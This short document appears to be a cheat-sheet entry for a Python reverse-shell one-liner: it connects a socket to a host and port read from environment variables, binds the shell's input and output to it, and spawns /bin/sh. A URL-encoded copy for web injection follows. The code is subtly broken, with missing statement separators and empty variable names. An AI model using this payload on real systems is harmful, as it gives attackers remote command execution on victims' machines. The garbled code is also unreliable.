python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""),int(os.getenv(""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'

#URL ENCODED

python%20-c%20'import%20sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(%22%22),int(os.getenv(%22%22))))%5Bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5Dpty.spawn(%22/bin/sh%22)'
